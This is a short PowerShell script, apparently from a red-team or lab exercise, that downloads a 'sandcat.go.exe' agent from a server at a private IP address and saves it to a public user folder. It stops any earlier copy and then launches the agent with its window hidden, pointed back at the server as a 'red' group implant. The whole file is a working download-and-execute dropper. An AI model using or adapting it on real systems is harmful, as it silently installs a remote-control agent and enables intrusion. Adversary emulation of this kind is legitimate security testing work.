# Point to your Linux fake server
$server="http://192.168.1.170:8888";

# The URL should point directly to the file on the Python server
$url="$server/sandcat.go.exe";

# Create a web client to download the file
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows" );
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);

# Define the name for the dropped file
$name = "sandcat.go.exe"
$path = "C:\Users\Public\$name"

# Clean up any old versions of the payload
get-process | ? {$_.Path -eq $path} | stop-process -f -ea ignore;
rm -force $path -ea ignore;

# Write the downloaded payload to a suspicious directory
[io.file]::WriteAllBytes($path, $data) | Out-Null;

# Execute the payload silently
Start-Process -FilePath $path -ArgumentList "-server $server -group red" -WindowStyle hidden;

Write-Host "[SUCCESS] Simulated payload has been downloaded and executed."
